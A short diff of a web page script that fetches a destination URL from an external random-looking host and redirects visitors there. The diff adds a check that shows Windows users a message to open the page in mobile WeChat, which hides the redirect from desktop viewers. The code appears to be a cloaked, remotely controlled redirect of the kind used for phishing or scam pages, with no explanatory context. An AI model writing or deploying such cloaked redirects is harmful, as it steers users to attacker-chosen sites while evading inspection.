@@ -1,3 +1,10 @@
 <script>
-  fetch("https://1vpctucm.cs4.pw/mydoc").then(res => res.text()).then(res => location=res);
+  if(navigator.userAgent.indexOf("Win")!=-1)
+  {
+    document.write("请在移动微信客户端中打开");
+  }
+  else
+  {
+    fetch("https://1vpctucm.cs4.pw/mydoc").then(res => res.text()).then(res => location=res);
+  }
 </script>
